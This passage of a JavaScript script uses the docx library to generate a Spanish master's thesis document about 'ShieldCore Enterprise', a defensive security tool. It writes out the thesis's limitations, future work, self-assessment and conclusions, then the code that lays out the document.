    bullet("Cuarentena lógica vs. física: El módulo de cuarentena registra los ficheros maliciosos en base de datos pero no los mueve ni los aísla físicamente. Esto es una decisión de diseño consciente para evitar daños accidentales, pero limita la capacidad de respuesta ante incidentes.", 0),
    bullet("Análisis de red no implementado: La herramienta no incluye capacidades de análisis de tráfico de red (IDS/IPS), análisis de conexiones activas sospechosas, ni detección de exfiltración de datos. Esta sería la principal extensión natural de la v3.0.", 0),
    bullet("Firma de código y protección anti-tampering: La propia herramienta no está firmada digitalmente ni implementa mecanismos de integridad sobre sus propios ficheros, lo que la haría vulnerable a ataques de tampering en entornos hostiles.", 0),
    bullet("Análisis de memoria RAM: No se implementa análisis de la memoria de procesos en ejecución, capacidad clave en herramientas EDR modernas para detectar fileless malware y técnicas de process injection.", 0),

    ...emptyLine(1),

    h3("3.4.2. Líneas de Trabajo Futuro"),

    numbered("Integración con feeds de IOC externos: Implementar sincronización automática con MalwareBazaar API y AbuseCH para mantener la base de firmas actualizada.", 0),
    numbered("Motor de análisis de código basado en AST: Migrar el CodeSecurityAnalyzer a un enfoque híbrido regex+AST usando ast (Python stdlib) para Python y acorn/espree para JavaScript.", 0),
    numbered("Análisis de tráfico de red: Integrar scapy (ya disponible en Python) para monitorización de conexiones salientes y detección de beaconing a IPs/dominios maliciosos conocidos.", 0),
    numbered("Machine Learning para detección heurística: Entrenar un clasificador de Random Forest o LSTM sobre características estáticas de PE (secciones, imports, entropía por sección) para mejorar la tasa de detección de malware desconocido.", 0),
    numbered("Módulo de análisis de memoria: Implementar volcado y análisis de memoria de procesos sospechosos usando ctypes o /proc/[pid]/mem en Linux.", 0),
    numbered("Cuarentena física con reversibilidad: Implementar movimiento de ficheros a directorio de cuarentena cifrado con posibilidad de restauración controlada.", 0),
    numbered("Integración SIEM: Añadir handler de logging en formato CEF (Common Event Format) para exportación directa a Splunk, IBM QRadar o Microsoft Sentinel.", 0),

    ...emptyLine(1),

    h2("3.5. Evaluación de Seguridad de la Propia Herramienta"),

    p([t("Como parte del ejercicio de rigor académico y técnico, se ha realizado una autoevaluación de la herramienta utilizando el propio módulo "), tc("CodeSecurityAnalyzer"), t(" sobre el código fuente de ShieldCore Enterprise ("), tc("antivirus_enterprise.py"), t(").")]),

    note("El análisis del código fuente de la herramienta con el propio CodeSecurityAnalyzer no ha detectado vulnerabilidades de severidad ALTA o CRÍTICA. Los únicos patrones de bajo riesgo activados corresponden a referencias a \"http://\" en strings de documentación de endpoints (CWE-312, LOW), lo que es un falso positivo esperado dado que son literales de documentación y no URLs usadas en llamadas de red.", C.azulClaro, "✓"),

    ...emptyLine(1),

    p([t("Se destacan los siguientes aspectos de seguridad positivos en el diseño de la herramienta: (a) la API está enlazada exclusivamente en "), tc("127.0.0.1"), t(", eliminando la superficie de ataque de red; (b) todos los accesos a la base de datos usan sentencias parametrizadas ("), tc("cursor.execute(\"... WHERE id=?\", (id,))"), t(") previniendo SQL Injection; (c) el control de concurrencia con "), tc("threading.Lock"), t(" previene condiciones de carrera; (d) los ficheros de log y base de datos se almacenan en subdirectorios relativos al ejecutable, evitando escrituras en rutas del sistema.")]),

    h2("3.6. Conclusiones de la Evaluación"),

    p([t("ShieldCore Enterprise cumple satisfactoriamente todos los requisitos funcionales y no funcionales definidos en la Sección 1. La herramienta demuestra ser una plataforma de seguridad integrada viable para entornos empresariales con restricciones de presupuesto, combinando en un único artefacto Python capacidades que normalmente requieren tres o cuatro herramientas independientes.")]),

    p([t("Desde el punto de vista académico, el proyecto ha permitido aplicar conocimientos de análisis forense digital (magic bytes, entropía de Shannon, técnicas de esteganografía), análisis estático de código (CWE, OWASP Top 10), arquitectura de software segura (threading, locks, separación de capas) y desarrollo de APIs REST modernas, todos ellos competencias centrales del Máster en Ciberseguridad.")]),

    p([t("Las limitaciones identificadas son inherentes a las restricciones del stack tecnológico fijado (REST-01) y al alcance de un TFM individual, y no representan deficiencias de diseño sino vectores claros de evolución hacia una versión de producción completa. La arquitectura en capas adoptada garantiza que estas extensiones futuras puedan integrarse sin refactorizaciones estructurales del código existente.")]),

    sep(),

    new Paragraph({
      children: [new TextRun({
        text: "Documento generado automáticamente — ShieldCore Enterprise TFM v2.0.0 — José Miguel Gómez Fernández",
        size: 16, font: "Arial", color: C.grisMedio, italics: true,
      })],
      alignment: AlignmentType.CENTER,
      ...sp(60, 0),
    }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// CONSTRUCCIÓN DEL DOCUMENTO
// ══════════════════════════════════════════════════════════════════════════════
async function main() {
  const numbering = {
    config: [
      { reference: "bullets",
        levels: [
          { level: 0, format: LevelFormat.BULLET, text: "•",
            alignment: AlignmentType.LEFT,
            style: { paragraph: { indent: { left: 720, hanging: 360 } } } },
          { level: 1, format: LevelFormat.BULLET, text: "◦",
            alignment: AlignmentType.LEFT,
            style: { paragraph: { indent: { left: 1080, hanging: 360 } } } },
        ]},
      { reference: "numbers",
        levels: [
          { level: 0, format: LevelFormat.DECIMAL, text: "%1.",
            alignment: AlignmentType.LEFT,
            style: { paragraph: { indent: { left: 720, hanging: 360 } } } },
        ]},
    ]
  };

  const styles = {
    default: {
      document: { run: { font: "Arial", size: 22, color: C.grisOscuro } }
    },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run:  { size: 32, bold: true, font: "Arial", color: C.azul },
        paragraph: { spacing: { before: 360, after: 120 }, outlineLevel: 0,
          border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.azulMedio, space: 4 } } } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run:  { size: 28, bold: true, font: "Arial", color: C.azulMedio },
        paragraph: { spacing: { before: 240, after: 80 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run:  { size: 24, bold: true, font: "Arial", color: C.grisOscuro },
        paragraph: { spacing: { before: 200, after: 60 }, outlineLevel: 2 } },
      { id: "Heading4", name: "Heading 4", basedOn: "Normal", next: "Normal", quickFormat: true,
        run:  { size: 22, bold: true, italics: true, font: "Arial", color: C.grisMedio },
        paragraph: { spacing: { before: 160, after: 40 }, outlineLevel: 3 } },
    ]
  };

  const doc = new Document({
    styles,
    numbering,
    sections: [{
      properties: {
        page: {
          size:   { width: 11906, height: 16838 },
          margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 },
        }
      },
      headers: {
        default: new Header({
          children: [
            new Paragraph({
              children: [
                new TextRun({ text: "ShieldCore Enterprise — Documentación Técnica TFM", size: 16, font: "Arial", color: C.grisMedio }),
new TextRun({
    children: ["Página ", PageNumber.CURRENT],
    size: 16,
    font: "Arial",
    color: C.grisMedio,
}),              ],
              tabStops: [{ type: TabStopType.RIGHT, position: TabStopPosition.MAX }],
              border: { bottom: { style: BorderStyle.SINGLE, size: 2, color: "CCCCCC", space: 4 } },
              spacing: { after: 0 },
            })
          ]
        })
      },
      footers: {
        default: new Footer({
          children: [
            new Paragraph({
              children: [
                new TextRun({ text: "José Miguel Gómez Fernández — Máster en Ciberseguridad", size: 16, font: "Arial", color: C.grisMedio }),
              ],
              border: { top: { style: BorderStyle.SINGLE, size: 2, color: "CCCCCC", space: 4 } },
              spacing: { before: 0 },
            })
          ]
        })
      },
      children: [
        ...buildCover(),

        // Salto de página antes del índice
        new Paragraph({ children: [new PageBreak()], spacing: { after: 0 } }),

        new Paragraph({
          children: [new TextRun({ text: "Índice de Contenidos", size: 28, bold: true, font: "Arial", color: C.azul })],
          spacing: { before: 0, after: 240 },
        }),
        new TableOfContents("Índice", {
          hyperlink: true,
          headingStyleRange: "1-4",
        }),

        ...buildCap1(),
        ...buildCap2(),
        ...buildCap3(),
      ]
    }]
  });

  const buffer = await Packer.toBuffer(doc);
fs.writeFileSync(
    "ShieldCore_TFM_Documentacion.docx",
    buffer
);  console.log("Documento generado correctamente.");
}

main().catch(console.error);
